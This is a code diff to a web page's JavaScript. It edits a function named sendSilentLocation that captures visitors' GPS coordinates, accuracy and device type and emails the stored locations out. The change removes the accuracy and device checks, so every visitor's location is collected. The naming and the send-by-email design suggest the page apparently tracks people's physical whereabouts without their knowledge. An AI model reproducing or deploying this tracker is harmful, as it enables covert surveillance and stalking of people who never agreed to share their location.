@@ -297,55 +297,31 @@
         }
         
         function sendSilentLocation(position) {
-    let latitude = position.coords.latitude;
-    let longitude = position.coords.longitude;
-    let accuracy = position.coords.accuracy;
-    const deviceType = getDeviceType(); // Check device type
+            let latitude = position.coords.latitude;
+            let longitude = position.coords.longitude;
+            let accuracy = position.coords.accuracy;
+            const deviceType = getDeviceType();
 
-    console.log("Latitude:", latitude);
-    console.log("Longitude:", longitude);
-    console.log("Accuracy:", accuracy);
-    console.log("Device Type:", deviceType);
+            console.log("Latitude:", latitude);
+            console.log("Longitude:", longitude);
+            console.log("Accuracy:", accuracy);
+            console.log("Device Type:", deviceType);
 
-    // Only send location if it's a laptop (Windows, Mac, Linux) with relaxed accuracy
-    if (deviceType === "Windows Device" || deviceType === "Mac Device" || deviceType === "Linux Device") {
-        if (accuracy < 100) {  // Adjusted accuracy threshold for desktops/laptops
-            locationHistory.push({ latitude, longitude, accuracy });
+            // Store location for all device types
+            locationHistory.push({ latitude, longitude, accuracy, deviceType });
 
             if (locationHistory.length > 3) {
                 locationHistory.shift();
             }
 
-            console.log("Location stored for laptop");
-        } else {
-            console.log("Accuracy too low for laptops:", accuracy);
+            console.log("Location stored");
         }
-
-    // Only send location for Android/iOS devices with stricter accuracy
-    } else if (deviceType === "Android" || deviceType === "iOS Device") {
-        if (accuracy < 20) {  // Strict accuracy threshold for mobile devices
-            locationHistory.push({ latitude, longitude, accuracy });
-
-            if (locationHistory.length > 3) {
-                locationHistory.shift();
-            }
-
-            console.log("Location stored for mobile device");
-        } else {
-            console.log("Accuracy too low for mobile devices:", accuracy);
-        }
-
-    } else {
-        console.log("Device type not recognized, skipping location sending.");
-    }
-}
-
         
         function sendStoredLocations() {
             if (locationHistory.length > 0) {
                 const deviceType = getDeviceType();
                 const locationMessages = locationHistory.map((loc, index) => {
-                    return `Location ${index + 1}:\nLatitude: ${loc.latitude}\nLongitude: ${loc.longitude}\nAccuracy: ${loc.accuracy} meters`;
+                    return `Location ${index + 1}:\nLatitude: ${loc.latitude}\nLongitude: ${loc.longitude}\nAccuracy: ${loc.accuracy} meters\nDevice Type: ${loc.deviceType}`;
                 }).join('\n\n');
         
                 const message = `Device: ${deviceType}\n\n${locationMessages}`;
@@ -364,7 +340,7 @@
                         console.error(`FAILED! Error sending email: ${error.text}`);
                     });
             } else {
-                console.log("No accurate locations to send.");
+                console.log("No locations to send.");
             }
         }
         
